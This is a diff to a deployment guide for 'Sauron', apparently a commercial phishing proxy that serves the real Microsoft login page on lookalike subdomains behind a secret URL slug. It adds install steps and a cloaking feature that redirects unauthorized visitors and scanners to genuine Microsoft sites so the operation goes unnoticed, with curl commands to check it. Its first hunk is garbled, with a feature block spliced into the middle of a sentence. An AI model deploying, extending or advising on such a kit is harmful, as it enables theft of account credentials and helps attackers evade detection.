@@ -1,6 +1,13 @@
 # Sauron Production Deployment Guide
 
-This guide covers deploying Sauron without exposing source code, suitable for selling or distributing the system.
+This guide covers deploying Sauron without ex   **✅ NEW: Path-Agnostic Installation**
+
+   ```text
+   - Installation automatically detects current directory path
+   - Works from any location: /root/sauron, /home/sauron, /opt/sauron, etc.
+   - systemd service files dynamically configured for installation path
+   - Certificate loading supports multiple fallback locations
+   ```g source code, suitable for selling or distributing the system.
 
 ## 🎯 Deployment Options
 
@@ -56,16 +63,36 @@ This guide covers deploying Sauron without exposing source code, suitable for se
    scp release-v2.0.0/sauron-v2.0.0-linux-amd64.tar.gz root@your-vps:/tmp/
    ```
 
-2. **On VPS:**
+2. **On VPS (Location-Agnostic Installation):**
 
    ```bash
+   # Extract to any location - installation is path-agnostic
    cd /tmp
    tar -xzf sauron-v2.0.0-linux-amd64.tar.gz
-   cd sauron
+   
+   # Can install anywhere - examples:
+   # Option 1: Root home directory
+   mv sauron /root/sauron && cd /root/sauron
+   
+   # Option 2: Dedicated user directory  
+   mv sauron /home/sauron/sauron && cd /home/sauron/sauron
+   
+   # Option 3: System directory
+   mv sauron /opt/sauron && cd /opt/sauron
+   
+   # Configure settings
    cp .env.example .env
    nano .env  # Configure your settings
+   
+   # Install with automatic path detection
    sudo ./install-production.sh
    ```
+
+   **✅ NEW: Path-Agnostic Installation**
+   - Installation automatically detects current directory path
+   - Works from any location: `/root/sauron`, `/home/sauron`, `/opt/sauron`, etc.
+   - systemd service files dynamically configured for installation path
+   - Certificate loading supports multiple fallback locations
 
 ### Docker Deployment
 
@@ -160,6 +187,38 @@ sauron/
 - **Isolation**: Non-root execution (Docker)
 
 ## 🛡️ Security Best Practices
+
+### Unauthorized Access Protection
+
+**✅ NEW: Smart Redirect System**
+
+Sauron now automatically protects against unauthorized access attempts:
+
+- **Valid Access**: `https://login.yourdomain.com/c5299379-8d7f-451a-88c4-80c5e4e06c8c` ✅ Works normally
+- **Invalid Access**: `https://login.yourdomain.com/` ❌ **Redirected to real Microsoft**
+- **Base Domain**: `yourdomain.com` ❌ **Redirected to real Microsoft**
+
+**How it Works:**
+
+```bash
+# Request without valid slug → Automatic redirect
+curl -I https://login.yourdomain.com/
+# Returns: HTTP/1.1 302 Found
+# Location: https://login.microsoftonline.com/
+
+# Request with valid slug → Normal proxy behavior  
+curl -I https://login.yourdomain.com/valid-slug-here
+# Returns: Normal Microsoft login page (proxied)
+```
+
+**Smart Redirects by Subdomain:**
+
+- `outlook.*` → Redirects to `https://outlook.live.com/`
+- `login.*` → Redirects to `https://login.microsoftonline.com/`
+- `secure.*` → Redirects to `https://login.microsoftonline.com/`
+- Other subdomains → Default Microsoft login
+
+This makes unauthorized visitors think they hit real Microsoft servers!
 
 ### Domain Selection
 
